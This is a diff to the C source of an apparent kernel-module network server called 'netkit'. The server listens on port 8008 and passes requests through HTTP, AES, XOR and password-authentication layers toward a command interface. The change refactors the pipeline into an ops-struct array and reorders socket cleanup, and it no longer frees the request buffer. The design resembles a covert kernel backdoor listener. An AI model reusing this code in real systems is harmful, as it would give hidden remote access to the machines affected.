@@ -15,11 +15,18 @@
 
 #include "server.h"
 
+#include "../../cmd/iface.h"
 #include "../../sys/mem.h"
 #include "../../sys/socket.h"
 #include "../../sys/debug.h"
 #include "../../sys/symbol.h"
 #include "../../sys/task.h"
+
+#include "../../pipeline/iface.h"
+#include "../../pipeline/aes/aes.h"
+#include "../../pipeline/auth_password/auth_password.h"
+#include "../../pipeline/http/http.h"
+#include "../../pipeline/xor/xor.h"
 
 #define SERVER_IP "0.0.0.0"
 #define SERVER_PORT 8008
@@ -31,12 +38,12 @@ static struct kref active_conns;
 DECLARE_WAIT_QUEUE_HEAD(all_conns_handled_wait_queue);
 static struct task_struct *task_conn_loop = NULL;
 
-static pipeline_func_t SERVER_PIPELINE_FUNCTIONS[] = {
-    layer_http_process,
-    layer_aes_process,
-    layer_xor_process,
-    layer_auth_password_process,
-    pipeline_final_process
+const static struct pipeline_ops *SERVER_PIPELINE_OPS_ARR[] = {
+    &LAYER_HTTP_OPS,
+    &LAYER_AES_OPS,
+    &LAYER_XOR_OPS,
+    &LAYER_PASSWORD_AUTH_OPS,
+    NULL
 };
 
 static int server_conn_handler(void *args)
@@ -49,16 +56,23 @@ static int server_conn_handler(void *args)
     kref_get(&active_conns);
 
     NETKIT_LOG("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
-    retv = io_process(SERVER_PIPELINE_FUNCTIONS, packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
+    retv = io_process(SERVER_PIPELINE_OPS_ARR, packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
 
     // if io_process failed, do not write to socket
-    if (retv >= 0)
-        retv = socket_write(packet->client_sk, res_buf, res_buflen);
+    if (res_buflen == 0)
+        goto LAB_REL_SOCK_NO_BUF;
 
-    sock_release(packet->client_sk);
-    kzfree(packet->req_buf, packet->req_buflen);
-    kzfree(packet, sizeof(*packet));
+    if (retv < 0)
+        goto LAB_REL_SOCK;
+    
+    NETKIT_LOG("[*] writing %lu bytes...\n", res_buflen);
+    retv = socket_write(packet->client_sk, res_buf, res_buflen);
+
+LAB_REL_SOCK:
     kzfree(res_buf, res_buflen);
+LAB_REL_SOCK_NO_BUF:
+    sock_release(packet->client_sk);
+    kzfree(packet, sizeof(*packet));
     
     // kref_sub without release()
     atomic_sub(1, (atomic_t *)&active_conns.refcount);
